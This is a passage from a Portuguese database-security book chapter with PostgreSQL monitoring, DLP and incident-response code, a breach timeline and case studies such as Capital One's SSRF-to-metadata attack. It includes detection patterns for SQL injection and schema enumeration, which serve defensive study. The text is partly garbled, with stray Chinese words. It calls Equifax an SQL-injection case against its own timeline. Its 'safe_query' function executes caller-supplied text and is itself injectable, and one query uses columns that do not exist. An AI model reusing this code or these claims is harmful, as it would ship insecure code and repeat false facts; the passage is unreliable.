    encode(sha256('dados sensiveis'::bytea), 'hex')
);

-- =====================================================
-- CAMADA 5: MONITORAMENTO
-- =====================================================
-- Audit logging completo
-- Anomaly detection em tempo real
-- Real-time alerting via webhooks/email
-- SIEM integration

-- Configurar pgaudit
CREATE EXTENSION IF NOT EXISTS pgaudit;
ALTER SYSTEM SET pgaudit.log = 'write, ddl';
ALTER SYSTEM SET pgaudit.log_catalog = on;

-- Dashboard de seguranca
CREATE OR REPLACE VIEW security_dashboard AS
SELECT 
    'Active Sessions' AS metric,
    COUNT(*)::TEXT AS value,
    NOW() AS updated
FROM pg_stat_activity
WHERE state = 'active'
UNION ALL
SELECT 
    'Failed Logins (24h)',
    COUNT(*)::TEXT,
    NOW()
FROM login_monitoring
WHERE login_success = FALSE
AND login_time > NOW() - INTERVAL '24 hours'
UNION ALL
SELECT 
    'Suspicious Queries (24h)',
    COUNT(*)::TEXT,
    NOW()
FROM query_audit
WHERE risk_score > 0.7
AND audit_time > NOW() - INTERVAL '24 hours'
UNION ALL
SELECT 
    'Open Security Incidents',
    COUNT(*)::TEXT,
    NOW()
FROM security_incidents
WHERE status = 'OPEN';

-- =====================================================
-- CAMADA 6: RESPOSTA A INCIDENTES
-- =====================================================
-- Automated response para ameacas detectadas
-- Forensic readiness com logs preservados
-- Recovery procedures testadas regularmente
-- Comunicacao de crise preparada

-- Funcao de resposta automatica
CREATE OR REPLACE FUNCTION auto_respond_to_incident()
RETURNS TRIGGER AS $$
BEGIN
    -- Para incidentes criticos, tomar acao automatica
    IF NEW.severity = 'CRITICAL' THEN
        -- Bloquear usuario (se aplicavel)
        IF NEW.username IS NOT NULL THEN
            UPDATE users 
            SET is_locked = TRUE, 
                locked_reason = NEW.incident_type,
                locked_at = NOW()
            WHERE username = NEW.username;
        END IF;
        
        -- Notificar SOC via multiple canais
        PERFORM pg_notify('security_alert', NEW.details);
        
        -- Log para SIEM
        INSERT INTO siem_events (event_type, severity, details, timestamp)
        VALUES (NEW.incident_type, NEW.severity, NEW.details, NOW());
    END IF;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

### Monitoramento em Tempo Real

```sql
-- Queries de monitoramento essenciais

-- 1. Queries ativas por usuario
SELECT 
    usename,
    client_addr,
    state,
    LEFT(query, 100) AS query_preview,
    query_start,
    NOW() - query_start AS duration,
    rows
FROM pg_stat_activity
WHERE state = 'active'
AND query NOT LIKE '%pg_stat_activity%'
ORDER BY duration DESC;

-- 2. Tabelas mais acessadas (possivel indicio de exfiltracao)
SELECT 
    schemaname,
    relname AS table_name,
    seq_scan,
    seq_tup_read,
    idx_scan,
    n_tup_ins,
    n_tup_upd,
    n_tup_del,
    last_vacuum,
    last_autovacuum
FROM pg_stat_user_tables
WHERE seq_tup_read > 1000000
ORDER BY seq_tup_read DESC;

-- 3. Conexoes por periodo (detectar padroes anomais)
SELECT 
    date_trunc('hour', query_start) AS hour,
    usename,
    COUNT(*) AS query_count,
    SUM(rows) AS total_rows
FROM pg_stat_statements
WHERE query_start > NOW() - INTERVAL '24 hours'
GROUP BY date_trunc('hour', query_start), usename
ORDER BY hour DESC, total_rows DESC;

-- 4. Acesso a informacao de schema (possivel enumeracao)
SELECT 
    user_name,
    query_text,
    execution_time,
    client_ip
FROM query_audit
WHERE query_text ~* 'information_schema|sysobjects|pg_catalog'
AND execution_time > NOW() - INTERVAL '24 hours'
ORDER BY execution_time DESC;
```

## Timeline de Grandes Ataques a Databases

### 2011-2023

```sql
CREATE TABLE attack_timeline (
    year INT,
    month VARCHAR(20),
    attack_name VARCHAR(200),
    target VARCHAR(200),
    vector VARCHAR(100),
    records_exposed BIGINT,
    impact VARCHAR(20),
    key_lesson VARCHAR(200)
);

INSERT INTO attack_timeline VALUES
(2011, 'Junho', 'Sony PlayStation Network', 'Sony',
 'SQL Injection', 77000000, 'CRITICO',
 'SQL injection em APIs de jogos online'),
(2013, 'Marco', 'Adobe Systems', 'Adobe',
 'Credential Compromise', 153000000, 'CRITICO',
 'Credenciais armazenadas com hash fraco (SHA-1 sem salt)'),
(2013, 'Dezembro', 'Target Corporation', 'Target',
 'Credential Compromise', 110000000, 'CRITICO',
 'Credenciais de terceiros comprometem POS systems'),
(2014, 'Abril', 'Heartbleed', 'OpenSSL',
 'Memory Leak', 0, 'CRITICO',
 'Vulnerabilidade de memoria expoe credenciais em massa'),
(2014, 'Setembro', 'Home Depot', 'Home Depot',
 'Credential Compromise', 56000000, 'CRITICO',
 'Malware em POS systems rouba dados de cartao'),
(2015, 'Setembro', 'TalkTalk', 'TalkTalk',
 'SQL Injection', 157000, 'ALTO',
 'SQL injection em API web expoe dados de clientes'),
(2016, 'Fevereiro', 'Yahoo', 'Yahoo',
 'Credential Compromise', 500000000, 'CRITICO',
 'Ataque state-sponsored compromete 500M contas'),
(2017, 'Setembro', 'Equifax', 'Equifax',
 'Unpatched Software', 147000000, 'CRITICO',
 'Patch nao aplicado por meses causa violacao massiva'),
(2018, 'Novembro', 'Marriott', 'Marriott',
 'Credential Compromise', 500000000, 'CRITICO',
 'Accesso nao detectado por 4 anos apos aquisicao'),
(2019, 'Julho', 'Capital One', 'Capital One',
 'Cloud Misconfiguration', 106000000, 'CRITICO',
 'SSRF + cloud permissions mal configurados'),
(2020, 'Dezembro', 'SolarWinds', 'Multiplas organizacoes',
 'Supply Chain', 18000, 'CRITICO',
 'Build pipeline comprometido afeta 18K organizacoes'),
(2021, 'Maio', 'Colonial Pipeline', 'Colonial Pipeline',
 'Credential Stuffing', 0, 'CRITICO',
 'VPN sem MFA permite acesso com credenciais vazadas'),
(2022, 'Agosto', 'LastPass', 'LastPass',
 'Employee Compromise', 33000000, 'CRITICO',
 'Malware + chaves de criptografia comprometidas'),
(2022, 'Setembro', 'Uber', 'Uber',
 'MFA Fatigue', 0, 'ALTO',
 'MFA por push notification explorada via fatigue'),
(2023, 'Maio', 'MOVEit', '2500+ organizacoes',
 'SQL Injection', 65000000, 'CRITICO',
 'SQL injection em software de terceiros afeta escala global');

-- Analise temporal: quantos registros vazados por ano
SELECT 
    year,
    COUNT(*) AS total_attacks,
    SUM(records_exposed) AS total_records,
    array_agg(DISTINCT vector) AS attack_vectors
FROM attack_timeline
GROUP BY year
ORDER BY year;

-- Analise por vetor de ataque
SELECT 
    vector,
    COUNT(*) AS occurrences,
    SUM(records_exposed) AS total_records,
    ROUND(AVG(records_exposed)::numeric, 0) AS avg_records,
    ROUND((COUNT(*)::DECIMAL / (SELECT COUNT(*) FROM attack_timeline) * 100), 1) AS percentage
FROM attack_timeline
GROUP BY vector
ORDER BY occurrences DESC;
```

### Evolucao dos Vetores de Ataque

```sql
-- Tendencias ao longo do tempo

-- 2011-2014: SQL Injection e Credential Compromise dominavam
-- 2015-2018: Supply Chain e Advanced Persistent Threats cresceram
-- 2019-2023: Cloud misconfiguration, MFA fatigue e supply chain sofisticado

-- Projecao para defesa
CREATE TABLE defense_evolution (
    period VARCHAR(20),
    dominant_vectors TEXT[],
    recommended_focus TEXT[],
    emerging_threats TEXT[]
);

INSERT INTO defense_evolution VALUES
('2011-2014', 
 ARRAY['SQL Injection', 'Credential Compromise', 'Malware'],
 ARRAY['Parameterized queries', 'Strong passwords', 'Antivirus'],
 ARRAY['Advanced persistent threats']),
('2015-2018',
 ARRAY['Credential Compromise', 'Phishing', 'SQL Injection'],
 ARRAY['MFA', 'Security training', 'WAF'],
 ARRAY['Supply chain attacks']),
('2019-2023',
 ARRAY['Supply Chain', 'Cloud Misconfiguration', 'MFA Fatigue'],
 ARRAY['Zero trust', 'SBOM', 'FIDO2', 'CSPM'],
 ARRAY['AI-powered attacks', 'Quantum computing threats']),
('2024+',
 ARRAY['AI-generated attacks', 'Quantum threats', 'Supply Chain'],
 ARRAY['Post-quantum crypto', 'AI-powered defense', 'Zero trust everywhere'],
 ARRAY['AI adversarial attacks', 'Quantum-resistant algorithms'));
```

## Resumo

Os ataques analisados neste capitulo revelam padroes claros e lições urgentes:

**SQL injection continua sendo um vetor letal.** Equifax e MOVEit mostram que, mesmo em 2023, SQL injection em aplicacoes web continua causando violacoes massivas. A solucao e basica mas critica: parametrizacao de queries, stored procedures, input validation e WAF.

**Supply chain e o novo campo de batalha.** SolarWinds e MOVEit demonstraram que mesmo organizacoes com boa seguranca interna podem ser comprometidas por software de terceiros. Vendor assessment, SBOM (Software Bill of Materials), build integrity e network segmentation sao essenciais.

**Credenciais sao o calcanhar de Aquiles.** Colonial Pipeline, Uber e LastPass mostram que credenciais fracas, reutilizadas ou mal gerenciadas sao o vetor mais acessivel para atacantes. MFA, passwordless authentication e secrets management sao defesas obrigatorias.

**Defense in depth nao e opcional.** Nenhum dos ataques teria sido tao devastador se多重 camadas de seguranca estivessem implementadas. Monitoramento, seguranca de rede, gerenciamento de credenciais e resposta a incidentes trabalham juntos.

**A velocidade de resposta importa.** A Equifax nao aplicou um patch disponivel por meses. A Moveit levou dias para notificar usuarios. Cada hora de atraso na resposta a incidentes multiplica o dano.

**Protecao de dados comeca antes do ataque.** Data minimization, classificacao de dados, criptografia at-rest e key management sao defesas proativas que limitam o impacto mesmo quando um ataque e bem-sucedido.

A seguranca de databases nao e um problema tecnico isolado. E um problema de processos, pessoas e tecnologia trabalhando em conjunto. Os ataques vao continuar evoluindo, mas os principios fundamentais permanecem: minimizar superficie de ataque, autenticar e autorizar rigorosamente, criptografar dados sensiveis, monitorar acessos e responder rapidamente a incidentes.

Aprendizado continuo e adaptacao sao essenciais. Cada novo ataque revela vetores e tecnicas que exigem atualizacao constante nas defesas. A equipe de seguranca deve estudar casos reais, participar de tabletop exercises e manter-se atualizada sobre ameacas emergentes. A seguranca nao e um destino, e uma jornada continua.

## Estudo Aprofundado: Capital One (2019)

### Contexto

Em julho de 2019, a Capital One sofreu uma violacao que expôs dados de 106 milhoes de clientes e ex-candidatos nos Estados Unidos e Canada. O ataque foi realizado por Paige Thompson, uma ex-engenheira da Amazon Web Services (AWS) que explorou uma configuracao incorreta de firewall e permissao excessiva em um servidor WAF (Web Application Firewall) da Capital One no AWS.

O ataque e particularmente relevante para databases porque demonstra como uma configuracao incorreta em um servico de cloud pode expor databases inteiros, mesmo quando a propria Capital One nao teve falha direta em seus codigos.

### A Cadeia de Ataque

```
Marco 2019 - Paige Thompson identifica a configuracao incorreta
  - A Capital One usava AWS WAF com permissao IAM excessiva
  - A role do WAF tinha acesso S3 para todos os buckets
  - Thompson explora SSRF (Server-Side Request Forgery) no WAF
  - Atraves do WAF, acessa metadata service do EC2 (169.254.169.254)
  - Obtém credenciais IAM do WAF
  
Marco-Julho 2019 - Exfiltracao de dados
  - Usa as credenciais IAM para acessar S3 buckets
  - Acessa 700+ S3 buckets da Capital One
  - Exfiltra dados de 106 milhoes de pessoas
  - Dados incluem: SSN, nomes, enderecos, credit scores, bank accounts
  
Julho 2019 - Deteccao
  - Alguem avisa a Capital One sobre o帐户 de Thompson
  - Capital One investiga e confirma a violacao
  - FBI prende Thompson
```

```sql
-- O ataque explorou configuracao incorreta de IAM (Identity and Access Management)
-- No AWS, roles IAM determinam quem pode acessar quais recursos

-- CONFIGURACAO INCORRETA (como a Capital One fazia):
-- {
--   "Version": "2012-10-17",
--   "Statement": [{
--     "Effect": "Allow",
--     "Action": [
--       "s3:GetObject",
--       "s3:ListBucket",
--       "s3:GetBucketLocation"
--     ],
--     "Resource": "arn:aws:s3:::*"  // ACESSO A TODOS OS BUCKETS!
--   }]
-- }

-- CONFIGURACAO CORRETA (pratica de seguranca):
-- {
--   "Version": "2012-10-17",
--   "Statement": [{
--     "Effect": "Allow",
--     "Action": [
--       "s3:GetObject",
--       "s3:ListBucket"
--     ],
--     "Resource": [
--       "arn:aws:s3:::waf-logs-*",  // APENAS buckets de logs do WAF
--       "arn:aws:s3:::waf-logs-*/*"
--     ]
--   }]
-- }

-- Para databases RDS no AWS, as mesmas principios se aplicam:
-- 1. Usar VPC (Virtual Private Cloud) para isolar databases
-- 2. Security Groups com regras restritivas
-- 3. IAM roles com least privilege
-- 4. Encryption at-rest com AWS KMS
-- 5. Encryption in-transit com SSL/TLS
```

```sql
-- Implementacao de least privilege para acesso a databases na cloud

-- ERRADO: Acesso administrativo para todas as roles
GRANT ALL PRIVILEGES ON DATABASE production TO app_role;

-- CORRETO: Permissoes especificas por funcao
-- Role para leitura (analytics)
CREATE ROLE analytics_reader;
GRANT CONNECT ON DATABASE production TO analytics_reader;
GRANT USAGE ON SCHEMA analytics TO analytics_reader;
GRANT SELECT ON ALL TABLES IN SCHEMA analytics TO analytics_reader;
-- NENHUM acesso a schemas de producao

-- Role para escrita (aplicacao)
CREATE ROLE app_writer;
GRANT CONNECT ON DATABASE production TO app_writer;
GRANT USAGE ON SCHEMA public TO app_writer;
GRANT INSERT, UPDATE ON orders, order_items, payments TO app_writer;
GRANT SELECT ON customers, products TO app_writer;  -- Leitura para validacao
GRANT USAGE ON SEQUENCE orders_id_seq, order_items_id_seq TO app_writer;
-- NENHUM acesso a tabelas de auditoria ou credenciais

-- Role para admin (apenas DBAs)
CREATE ROLE dba_admin;
GRANT CONNECT ON DATABASE production TO dba_admin;
GRANT ALL PRIVILEGES ON DATABASE production TO dba_admin;
-- Limitar a IP especifico via pg_hba.conf
```

## Estudo Aprofundado: Marriott International (2018)

### Contexto

Em novembro de 2018, a Marriott International revelou que o sistema de reservas Starwood (adquirido em 2016) foi comprometido, expondo dados de 500 milhoes de hoespedes. O ataque nao foi descoberto ate setembro de 2018, quase 4 anos apos o comprometimento inicial. Isso significa que o atacante teve acesso continuo aos databases da Marriott por quase 4 anos, exfiltrando dados gradualmente.

### A Longa Deteccao

```
2014 - Atacante compromete o sistema Starwood
  - Acesso ao database de reservas via credenciais comprometidas
  - Database contenha dados de 500M hoespedes
  
2014-2016 - Operacao de espionagem silenciosa
  - Atacante acessa database periodicamente
  - Exfiltra dados em lotes pequenos
  - Nenhuma deteccao por 2 anos
  
2016 - Marriott adquire Starwood
  - Aquisicao completa em setembro de 2016
  - Database do Starwood NAO e migrado imediatamente
  - Atacante continua com acesso durante integracao
  
2016-2018 - Continua durante integracao
  - Database legado do Starwood mantido
  - Atacante continua acessando
  - Nenhuma verificacao de seguranca durante integracao
  
Setembro 2018 - Deteccao
  - Ferramenta de seguranca finalmente detecta anomalias
  - Investigacao revela 4 anos de acesso nao autorizado
  
Novembro 2018 - Divulgacao
  - Marriott divulga publicamente a violacao
  - 500M registros comprometidos
  - Dados incluem: nomes, enderecos, numeros de passaporte,
    datas de nascimento, emails, numeros de telefone, historico de reservas
```

```sql
-- O erro critico da Marriott: database legado mantido apos aquisicao

-- CENARIO COMUM EM AQUISICOES:
-- 1. Empresa A adquire Empresa B
-- 2. Database da Empresa B e mantido por "compatibilidade"
-- 3. Seguranca do database legado e negligenciada
-- 4. Atacante explora o database legado

-- PREVENCAO: Migracao obrigatoria de databases apos aquisicao

CREATE TABLE acquisition_migration_checklist (
    checklist_id SERIAL PRIMARY KEY,
    acquisition_id VARCHAR(50) NOT NULL,
    source_company VARCHAR(100) NOT NULL,
    target_database VARCHAR(100) NOT NULL,
    migration_status VARCHAR(20) DEFAULT 'PENDING',
    security_audit_date DATE,
    security_audit_passed BOOLEAN,
    data_classification_complete BOOLEAN,
    access_review_complete BOOLEAN,
    encryption_verified BOOLEAN,
    legacy_access_revoked BOOLEAN,
    estimated_migration_date DATE,
    actual_migration_date DATE,
    notes TEXT
);

-- Regra: database legado deve ser desativado em 90 dias apos aquisicao
CREATE OR REPLACE FUNCTION enforce_legacy_database_decommission()
RETURNS TRIGGER AS $$
BEGIN
    IF NEW.migration_status = 'COMPLETED' 
    AND OLD.legacy_access_revoked = FALSE 
    AND NEW.legacy_access_revoked = TRUE THEN
        -- Database legado desativado, good
        NULL;
    ELSIF NEW.security_audit_date IS NOT NULL 
    AND NEW.security_audit_date < CURRENT_DATE - INTERVAL '90 days'
    AND NEW.migration_status != 'COMPLETED' THEN
        -- 90 dias apos audit, migration deve estar completa
        INSERT INTO security_incidents (incident_type, severity, details)
        VALUES ('LEGACY_DATABASE_NOT_DECOMMISSIONED', 'HIGH',
                FORMAT('Legacy database %s not decommissioned 90 days after acquisition %s',
                       NEW.target_database, NEW.acquisition_id));
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Verificar databases legados ativos
SELECT 
    acquisition_id,
    source_company,
    target_database,
    migration_status,
    security_audit_date,
    CURRENT_DATE - security_audit_date AS days_since_audit,
    CASE 
        WHEN migration_status = 'COMPLETED' THEN 'OK'
        WHEN CURRENT_DATE - security_audit_date > 90 THEN 'CRITICAL: Overdue'
        WHEN CURRENT_DATE - security_audit_date > 60 THEN 'WARNING: Approaching deadline'
        ELSE 'IN PROGRESS'
    END AS status
FROM acquisition_migration_checklist
WHERE migration_status != 'COMPLETED'
ORDER BY security_audit_date;
```

## Estudo Aprofundado: Yahoo (2013-2014)

### Contexto

O ataque ao Yahoo, revelado publicamente em 2016 mas ocorrido em 2013-2014, afetou 3 bilhoes de contas de usuarios — o maior vazamento de dados da historia. O ataque foi realizado por grupos de hackers associados ao governo russo, que comprometeram o database de autenticacao do Yahoo e roubaram hashes de senhas, nomes de usuarios, numeros de telefone, datas de nascimento e, para alguns usuarios, perguntas de seguranca e respostas.

### O Impacto em Databases

```sql
-- O Yahoo armazenava hashes de senhas com MD5 (algoritmo fraco)

-- HASH FRACO (como o Yahoo fazia):
-- hash = MD5(password)
-- MD5 e quebravel em segundos com hardware moderno

-- HASH SEGURO (pratica recomendada):
-- hash = bcrypt(password, salt, cost_factor)
-- bcrypt e resistente a ataques de brute force

-- Exemplo de verificacao de seguranca de hashes
CREATE TABLE password_security_audit (
    audit_id SERIAL PRIMARY KEY,
    username VARCHAR(128),
    hash_algorithm VARCHAR(50),
    salt_present BOOLEAN,
    hash_strength VARCHAR(20),
    last_password_change TIMESTAMPTZ,
    password_age_days INT,
    risk_level VARCHAR(20)
);

-- Identificar usuarios com hashes fracos
SELECT 
    username,
    hash_algorithm,
    salt_present,
    CASE 
        WHEN hash_algorithm = 'MD5' THEN 'CRITICAL'
        WHEN hash_algorithm = 'SHA1' THEN 'HIGH'
        WHEN hash_algorithm = 'SHA256' AND NOT salt_present THEN 'HIGH'
        WHEN hash_algorithm = 'bcrypt' AND salt_present THEN 'OK'
        WHEN hash_algorithm = 'argon2' THEN 'BEST'
        ELSE 'MEDIUM'
    END AS hash_strength,
    password_age_days,
    CASE 
        WHEN hash_algorithm IN ('MD5', 'SHA1') THEN 'CRITICAL: Upgrade hash'
        WHEN password_age_days > 365 THEN 'WARNING: Force password rotation'
        ELSE 'OK'
    END AS risk_level
FROM password_security_audit
WHERE hash_algorithm IN ('MD5', 'SHA1', 'SHA256')
AND salt_present = FALSE
ORDER BY risk_level DESC;

-- Implementacao de hash seguro com bcrypt
-- (usando extensao pgcrypto ou aplicacao)
-- Aplicacao:
-- hash = bcrypt(password, generate_salt(12))
-- verify = bcrypt_verify(password, stored_hash)
```

## Estudo Aprofundado: Ashley Madison (2015)

### Contexto

Em julho de 2015, o site de namoricos Ashley Madison foi hackeado pelo grupo Impact Team. O atacante ameacou publicar dados de 32 milhoes de usuarios a menos que o site fosse desligado. Quando a Avid Life Media (dona do site) recusou, o Impact Team publicou 25 GB de dados, incluindo emails, hashes de senhas, nomes de usuario e dados de transacao financeira.

### O Impacto em Databases

```sql
-- O Ashley Madison armazenava hashes de senhas com bcrypt
-- Mas com configuracao subotima (cost factor baixo)

-- PROBLEMA: bcrypt com cost factor 12 (subotimo)
-- O ideal e cost factor 14 ou maior

-- CORRECAO:
-- bcrypt(password, salt, cost=14)

-- Tambem publicaram dados de transacao:
-- Usuarios que pagaram por "deletar conta" tiveram dados mantidos
-- Isso demonstra que "delete" nem sempre significa delete

-- PREVENCAO: Verificar se dados realmente sao deletados
CREATE TABLE data_deletion_audit (
    deletion_id SERIAL PRIMARY KEY,
    user_id INT,
    deletion_requested_at TIMESTAMPTZ,
    deletion_completed_at TIMESTAMPTZ,
    records_deleted INT,
    records_remaining INT,
    deletion_verified BOOLEAN,
    verified_by VARCHAR(128),
    verified_at TIMESTAMPTZ
);

-- Verificar se deletacao foi realmente executada
SELECT 
    d.user_id,
    d.deletion_requested_at,
    d.deletion_completed_at,
    d.records_deleted,
    d.records_remaining,
    CASE 
        WHEN d.records_remaining > 0 THEN 'CRITICAL: Data not fully deleted'
        WHEN d.deletion_completed_at IS NULL THEN 'WARNING: Deletion pending'
        ELSE 'OK'
    END AS deletion_status
FROM data_deletion_audit d
WHERE d.records_remaining > 0
OR d.deletion_completed_at IS NULL
ORDER BY d.deletion_requested_at;
```

## Padroes de Defesa Detalhados

### Pattern 1: Zero Trust Database Access

```sql
-- Zero Trust: nunca confiar, sempre verificar
-- Cada acesso a database deve ser autenticado e autorizado

-- 1. Autenticacao por certificate
-- Configurar SSL client certificates no PostgreSQL
-- pg_hba.conf:
-- hostssl all all 0.0.0.0/0 cert clientcert=verify-full

-- 2. Autorizacao por context
-- Cada query deve verificar o contexto do usuario
CREATE OR REPLACE FUNCTION safe_query(p_user_id INT, p_query_type VARCHAR)
RETURNS TABLE(result JSON) AS $$
BEGIN
    -- Verificar se usuario tem permissao para este tipo de query
    IF NOT EXISTS (
        SELECT 1 FROM user_permissions 
        WHERE user_id = p_user_id 
        AND permission_type = p_query_type
        AND granted_at > NOW() - INTERVAL '24 hours'
    ) THEN
        RAISE EXCEPTION 'Permission denied for query type: %', p_query_type;
    END IF;
    
    -- Log da query
    INSERT INTO query_log (user_id, query_type, executed_at)
    VALUES (p_user_id, p_query_type, NOW());
    
    -- Executar query com timeout
    RETURN QUERY EXECUTE format('SELECT json_agg(t) FROM (%s) t', p_query_type);
END;
$$ LANGUAGE plpgsql;
```

### Pattern 2: Database Activity Monitoring (DAM)

```sql
-- Monitoramento de atividade em tempo real

CREATE TABLE dam_events (
    event_id BIGSERIAL PRIMARY KEY,
    event_time TIMESTAMPTZ DEFAULT NOW(),
    session_id VARCHAR(128),
    user_name VARCHAR(128),
    client_ip INET,
    database_name VARCHAR(128),
    event_type VARCHAR(50),
    object_type VARCHAR(50),
    object_name VARCHAR(256),
    query_text TEXT,
    rows_affected BIGINT,
    execution_time_ms INT,
    risk_score DECIMAL(3,2),
    blocked BOOLEAN DEFAULT FALSE
);

-- Regras de deteccao
CREATE OR REPLACE FUNCTION dam_evaluate_event()
RETURNS TRIGGER AS $$
BEGIN
    -- Regra 1: Acesso a informacao de schema
    IF NEW.query_text ~* 'information_schema|pg_catalog|sysobjects' THEN
        NEW.risk_score := 0.6;
    END IF;
    
    -- Regra 2: Operacoes DDL
    IF NEW.event_type IN ('CREATE', 'ALTER', 'DROP') THEN
        NEW.risk_score := 0.7;
    END IF;
    
    -- Regra 3: Acesso a tabelas sensiveis
    IF NEW.object_name IN ('users', 'credentials', 'payment_cards', 'ssn') THEN
        NEW.risk_score := 0.8;
    END IF;
    
    -- Regra 4: Queries com UNION (possivel SQL injection)
    IF NEW.query_text ~* 'union\s+select' THEN
        NEW.risk_score := 0.9;
        NEW.blocked := TRUE;
    END IF;
    
    -- Regra 5: Horario incomum (2am-5am)
    IF EXTRACT(HOUR FROM NEW.event_time) BETWEEN 2 AND 5 THEN
        NEW.risk_score := NEW.risk_score + 0.2;
    END IF;
    
    -- Regra 6: IP externo
    IF NEW.client_ip << '10.0.0.0/8' = FALSE 
       AND NEW.client_ip << '192.168.0.0/16' = FALSE THEN
        NEW.risk_score := NEW.risk_score + 0.3;
    END IF;
    
    -- Limitar score a 1.0
    NEW.risk_score := LEAST(1.0, NEW.risk_score);
    
    -- Alertar se score alto
    IF NEW.risk_score > 0.7 THEN
        PERFORM pg_notify('dam_alert',
            FORMAT('HIGH RISK EVENT: User %s, Score: %s, Query: %s',
                   NEW.user_name, NEW.risk_score, LEFT(NEW.query_text, 100)));
    END IF;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Relatorio de atividade suspeita
SELECT 
    user_name,
    client_ip,
    event_type,
    object_name,
    risk_score,
    blocked,
    event_time,
    LEFT(query_text, 200) AS query_preview
FROM dam_events
WHERE risk_score > 0.6
AND event_time > NOW() - INTERVAL '24 hours'
ORDER BY risk_score DESC, event_time DESC;
```

### Pattern 3: Data Loss Prevention (DLP)

```sql
-- Prevencao de perda de dados em databases

CREATE TABLE dlp_policies (
    policy_id SERIAL PRIMARY KEY,
    policy_name VARCHAR(255),
    table_pattern VARCHAR(255),
    column_pattern VARCHAR(255),
    data_type VARCHAR(50),
    action VARCHAR(20),  -- BLOCK, ALERT, MASK, ENCRYPT
    severity VARCHAR(20),
    enabled BOOLEAN DEFAULT TRUE
);

INSERT INTO dlp_policies VALUES
(1, 'Block SSN Export', '%', '%ssn%', 'PII', 'BLOCK', 'CRITICAL', TRUE),
(2, 'Mask Credit Cards', '%', '%credit_card%', 'PCI', 'MASK', 'CRITICAL', TRUE),
(3, 'Alert Large Exports', '%orders%', '%', 'BUSINESS', 'ALERT', 'HIGH', TRUE),
(4, 'Block Schema Export', '%', '%', 'METADATA', 'BLOCK', 'MEDIUM', TRUE);

-- Funcao DLP
CREATE OR REPLACE FUNCTION enforce_dlp(
    p_table_name VARCHAR,
    p_column_name VARCHAR,
    p_operation VARCHAR
)
RETURNS VARCHAR AS $$
DECLARE
    v_policy RECORD;
    v_action VARCHAR := 'ALLOW';
BEGIN
    FOR v_policy IN 
        SELECT * FROM dlp_policies 
        WHERE enabled = TRUE
        AND (p_table_name LIKE table_pattern OR table_pattern = '%')
        AND (p_column_name LIKE column_pattern OR column_pattern = '%')
    LOOP
        IF v_policy.action = 'BLOCK' THEN
            v_action := 'BLOCK';
            INSERT INTO dlp_violations (policy_id, table_name, column_name, operation, blocked_at)
            VALUES (v_policy.policy_id, p_table_name, p_column_name, p_operation, NOW());
        ELSIF v_policy.action = 'MASK' AND v_action != 'BLOCK' THEN
            v_action := 'MASK';
        ELSIF v_policy.action = 'ALERT' AND v_action NOT IN ('BLOCK', 'MASK') THEN
            v_action := 'ALERT';
        END IF;
    END LOOP;
    
    RETURN v_action;
END;
$$ LANGUAGE plpgsql;
```

### Pattern 4: Automated Incident Response

```sql
-- Resposta automatica a incidentes de database

CREATE TABLE incident_response_playbooks (
    playbook_id SERIAL PRIMARY KEY,
    incident_type VARCHAR(100),
    severity VARCHAR(20),
    response_actions TEXT[],
    escalation_required BOOLEAN,
    sla_hours INT
);

INSERT INTO incident_response_playbooks VALUES
(1, 'SQL_INJECTION_ATTEMPT', 'CRITICAL',
 ARRAY['BLOCK_IP_24H', 'NOTIFY_SOC', 'AUDIT_ALL_QUERIES', 'ENABLE_WAF_STRICT'],
 TRUE, 1),
(2, 'CREDENTIAL_COMPROMISE', 'CRITICAL',
 ARRAY['LOCK_ACCOUNT', 'FORCE_PASSWORD_RESET', 'REVOKE_ALL_SESSIONS', 'NOTIFY_USER'],
 TRUE, 1),
(3, 'DATA_EXFILTRATION', 'CRITICAL',
 ARRAY['BLOCK_USER', 'TERMINATE_SESSION', 'NOTIFY_SOC', 'PRESERVE_FORENSICS'],
 TRUE, 1),
(4, 'UNUSUAL_ACCESS_PATTERN', 'HIGH',
 ARRAY['NOTIFY_SOC', 'INCREASE_LOGGING', 'VERIFY_USER_IDENTITY'],
 TRUE, 4),
(5, 'FAILED_LOGIN_BURST', 'MEDIUM',
 ARRAY['RATE_LIMIT', 'NOTIFY_USER', 'INCREASE_MONITORING'],
 FALSE, 24);

-- Executar playbook automaticamente
CREATE OR REPLACE FUNCTION execute_incident_response(
    p_incident_type VARCHAR,
    p_severity VARCHAR,
    p_username VARCHAR DEFAULT NULL,
    p_ip_address INET DEFAULT NULL
)
RETURNS TEXT AS $$
DECLARE
    v_playbook RECORD;
    v_action TEXT;
    v_results TEXT := '';
BEGIN
    -- Buscar playbook
    SELECT * INTO v_playbook
    FROM incident_response_playbooks
    WHERE incident_type = p_incident_type
    AND severity = p_severity;
    
    IF NOT FOUND THEN
        RETURN 'No playbook found for incident';
    END IF;
    
    -- Executar cada acao
    FOREACH v_action IN ARRAY v_playbook.response_actions
    LOOP
        CASE v_action
            WHEN 'BLOCK_IP_24H' THEN
                INSERT INTO ip_blocklist (ip_address, blocked_until, reason)
                VALUES (p_ip_address, NOW() + INTERVAL '24 hours', p_incident_type);
                v_results := v_results || 'IP blocked for 24h; ';
            WHEN 'LOCK_ACCOUNT' THEN
                UPDATE users SET is_locked = TRUE, locked_reason = p_incident_type
                WHERE username = p_username;
                v_results := v_results || 'Account locked; ';
            WHEN 'FORCE_PASSWORD_RESET' THEN
                UPDATE users SET password_reset_required = TRUE, password_reset_deadline = NOW() + INTERVAL '24 hours'
                WHERE username = p_username;
                v_results := v_results || 'Password reset forced; ';
            WHEN 'REVOKE_ALL_SESSIONS' THEN
                DELETE FROM active_sessions WHERE username = p_username;
                v_results := v_results || 'All sessions revoked; ';
            WHEN 'NOTIFY_SOC' THEN
                PERFORM pg_notify('soc_alert', FORMAT('%s: %s', p_incident_type, p_severity));
                v_results := v_results || 'SOC notified; ';
            WHEN 'TERMINATE_SESSION' THEN
                PERFORM pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename = p_username;
                v_results := v_results || 'Session terminated; ';
            WHEN 'PRESERVE_FORENSICS' THEN
                INSERT INTO forensic_evidence (incident_type, username, ip_address, captured_at)
                VALUES (p_incident_type, p_username, p_ip_address, NOW());
                v_results := v_results || 'Forensics preserved; ';
            ELSE
                v_results := v_results || 'Unknown action: ' || v_action || '; ';
        END CASE;
    END LOOP;
    
    -- Registrar execucao
    INSERT INTO incident_response_log (incident_type, severity, username, ip_address, actions_taken, executed_at)
    VALUES (p_incident_type, p_severity, p_username, p_ip_address, v_results, NOW());
    
    RETURN v_results;
